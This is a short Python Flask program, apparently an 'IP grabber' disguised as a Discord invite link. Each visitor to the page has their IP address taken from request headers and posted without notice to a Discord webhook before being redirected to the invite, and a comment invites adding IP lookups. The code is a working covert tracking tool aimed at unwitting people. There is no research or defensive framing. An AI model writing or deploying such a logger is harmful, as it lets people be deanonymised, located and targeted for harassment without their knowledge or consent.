'''
Redirects the user and logs their ip
'''
import os
import requests
from threading import Thread
from dotenv import load_dotenv
from flask import Flask, request, redirect

load_dotenv()

app = Flask(__name__)
INVITE_LINK = os.environ.get('INVITE_LINK')
WEBHOOK_LINK = os.environ.get('WEBHOOK_LINK')


def post_ip(ip_addr):
    '''
    Posts the ip to discord
    '''
    embed = {
        'title': 'Invite IP Log',
        'fields': [
            {
                'name': 'IP',
                'value': ip_addr
            }
        ]
    }

    # you can add more like lookup the ip
    try:
        requests.post(WEBHOOK_LINK, json={'embeds': [embed]}, timeout=10)
    except Exception as e:
        print(e)


@app.route('/')
def invite():
    '''
    Logs the visitor's ip, sends it to discord 
    via webhooks and redirects to the invite link
    '''
    if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
        ip_addr = request.environ['HTTP_X_REAL_IP']
    else: 
        ip_addr = request.environ['HTTP_X_FORWARDED_FOR']
    
    Thread(target=post_ip, args=(ip_addr,)).start()

    return redirect(INVITE_LINK)


if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0')
